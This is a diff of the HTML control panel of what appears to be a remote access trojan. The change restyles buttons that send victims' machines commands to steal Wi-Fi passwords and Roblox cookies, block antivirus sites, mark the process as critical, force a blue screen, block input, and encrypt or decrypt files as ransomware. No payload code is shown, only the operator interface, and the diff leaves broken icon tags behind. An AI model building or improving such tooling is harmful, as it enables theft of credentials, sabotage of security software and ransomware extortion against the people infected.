@@ -264,15 +264,13 @@
         <div id="mainDashboard" class="dashboard-grid">
 
             <!-- 1. POWER -->
-            <div class="card" style="border-top: 3px solid var(--danger);">
+            <div class="card" style="border-top: 3px solid var(--warn);">
                 <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
                 <div class="btn-grid">
-                    <button class="btn-primary" onclick="cmd('lock_pc')"><i class="ph ph-lock"></i> Lock</button>
-                    <button class="btn-warn" onclick="cmd('restart_pc')"><i class="ph ph-arrows-clockwise"></i> Restart</button>
-                    <button class="btn-danger" onclick="confirmAction('shutdown_pc')"><i class="ph ph-power"></i> Shutdown</button>
-                    <button class="btn-danger" onclick="confirmAction('bsod')"><i class="ph ph-skull"></i> BSOD</button>
-                    <button class="btn-danger" onclick="toggleInput(true)"><i class="ph ph-keyboard-slash"></i> Block Input</button>
-                    <button class="btn-success" onclick="toggleInput(false)"><i class="ph ph-keyboard"></i> Free Input</button>
+                    <button class="btn-primary" style="background-color: var(--warn); border: none; color: white;" onclick="cmd('lock_pc')"></i> Lock PC</button>
+                    <button class="btn-warn" style="background-color: var(--warn); border: none; color: white;" onclick="cmd('restart_pc')"></i> Restart</button>
+                    <button class="btn-danger" style="background-color: var(--warn); border: none; color: white;" onclick="confirmAction('shutdown_pc')"></i> Shutdown</button>
+                    <button class="btn-danger" style="background-color: var(--warn); border: none; color: white;" onclick="confirmAction('bsod')"></i> BSOD</button>
                 </div>
             </div>
 
@@ -280,42 +278,43 @@
             <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-shield-warning" style="color:var(--danger);"></i> Security & Net</div>
                 <div class="btn-grid">
-                    <button class="btn-danger" onclick="cmd('block_av_sites')"><i class="ph ph-prohibit"></i> Block AV</button>
-                    <button class="btn-success" onclick="cmd('unblock_av_sites')"><i class="ph ph-check-circle"></i> Unblock AV</button>
-                    <button class="btn-danger" onclick="confirmAction('set_critical')"><i class="ph ph-warning"></i> Set Critical</button>
-                    <button class="btn-success" onclick="cmd('unset_critical')"><i class="ph ph-shield-check"></i> Unset</button>
-                    <button class="btn-primary" onclick="cmd('check_admin')" style="grid-column: span 2"><i class="ph ph-user-gear"></i> Check Admin Status</button>
+                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="toggleInput(true)"></i> Block Input</button>
+                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="toggleInput(false)"></i> Unblock Input</button>
+                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="cmd('block_av_sites')"></i> Block AV Sites</button>
+                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unblock_av_sites')"></i> Unblock AV</button>
+                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="confirmAction('set_critical')"></i> Set Critical</button>
+                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unset_critical')"></i> Unset Critical</button>
+                    <button class="btn-primary" style="grid-column: span 2; background-color: var(--danger); border: none;" onclick="cmd('check_admin')"></i> Check Admin Status</button>
                 </div>
             </div>
 
             <!-- 3. STEALERS -->
-            <div class="card" style="border-top: 3px solid var(--danger);">
-                <div class="card-title"><i class="ph ph-spy" style="color:#a855f7;"></i> Data Extraction</div>
+            <div class="card" style="border-top: 3px solid #a855f7;">
+                <div class="card-title"><i class="ph ph-database" style="color:#a855f7;"></i> Data Extraction</div>
                 <div class="btn-grid">
-                    <button class="btn-primary" onclick="cmd('wifi_stealer')"><i class="ph ph-wifi-high"></i> Steal Wi-Fi</button>
-                    <button class="btn-warn" onclick="cmd('grab_roblox')"><i class="ph ph-cookie"></i> Roblox Cookie</button>
-                    <button class="btn-neutral" onclick="cmd('hide_taskbar')"><i class="ph ph-eye-slash"></i> Hide Taskbar</button>
-                    <button class="btn-primary" onclick="cmd('show_taskbar')"><i class="ph ph-eye"></i> Show Taskbar</button>
+                    <button class="btn-primary" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('wifi_stealer')"></i> Steal Wi-Fi</button>
+                    <button class="btn-warn" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('grab_roblox')"></i> Roblox Cookie</button>
                 </div>
             </div>
-
             <!-- 4. ENCRYPTION -->
-            <div class="card" style="border-top: 3px solid var(--danger);">
-                <div class="card-title"><i class="ph ph-lock-key" style="color:var(--danger);"></i> Ransomware</div>
+            <div class="card" style="border-top: 3px solid #00e2e2;">
+                <div class="card-title"><i class="ph ph-lock-key" style="color:#00e2e2;"></i> Ransomware</div>
                 <div class="btn-grid">
-                    <button class="btn-danger" onclick="askForceEncrypt()"><i class="ph ph-lock-simple"></i> Encrypt</button>
-                    <button class="btn-success" onclick="askDecrypt()"><i class="ph ph-lock-open"></i> Decrypt</button>
+                    <button class="btn-danger" style="background-color: #00e2e2; border: none; color: white;" onclick="askForceEncrypt()"></i> Encrypt</button>
+                    <button class="btn-success" style="background-color: #00e2e2; border: none; color: white;" onclick="askDecrypt()"></i> Decrypt</button>
                 </div>
             </div>
 
             <!-- 5. MEDIA & TROLLING -->
-            <div class="card" style="border-top: 3px solid var(--danger);">
+            <div class="card" style="border-top: 3px solid var(--success);">
                 <div class="card-title"><i class="ph ph-speaker-high" style="color:var(--success);"></i> Media & Troll</div>
                 <div class="btn-grid">
-                    <button class="btn-primary" onclick="askTTS()"><i class="ph ph-microphone"></i> TTS Speak</button>
-                    <button class="btn-warn" onclick="cmd('jumpscare')"><i class="ph ph-ghost"></i> Jumpscare</button>
-                    <button class="btn-primary" onclick="askMsgBox()"><i class="ph ph-chat-centered-text"></i> Fake Error</button>
-                    <button class="btn-danger" onclick="cmd('block_screen')"><i class="ph ph-monitor-off"></i> Block Screen</button>
+                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="askTTS()"></i> TTS Speak</button>
+                    <button class="btn-warn" style="background-color: var(--success); border: none; color: white;" onclick="cmd('jumpscare')"></i> Jumpscare</button>
+                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="askMsgBox()"></i> Fake Error</button>
+                    <button class="btn-danger" style="background-color: var(--success); border: none; color: white;" onclick="cmd('block_screen')"></i> Block Screen</button>
+                    <button class="btn-neutral" style="background-color: var(--success); border: none; color: white;" onclick="cmd('hide_taskbar')"></i> Hide Taskbar</button>
+                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="cmd('show_taskbar')"></i> Show Taskbar</button>
                     
                     <div class="slider-container">
                         <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
